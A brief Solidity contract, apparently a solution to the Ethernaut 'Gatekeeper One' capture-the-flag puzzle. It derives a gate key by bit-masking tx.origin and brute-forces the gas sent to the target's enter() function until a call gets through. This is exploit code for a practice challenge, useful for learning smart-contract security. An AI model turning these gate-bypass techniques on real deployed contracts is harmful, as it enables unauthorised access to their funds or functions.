// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Entrant {

	function fire(address _gatekeeperOne) external {
		bytes8 key = bytes8(uint64(uint160(tx.origin) & 0xFFFFFFFF0000FFFF));

		bytes memory encodedFunction = abi.encodeWithSignature("enter(bytes8)", key);

		for (uint256 i = 0; i < 120; i++) {
			(bool result, ) = _gatekeeperOne.call{ gas: i + 150 + 8191 * 3 }(encodedFunction);
			if (result) {
				break;
			}
		}
	}

}
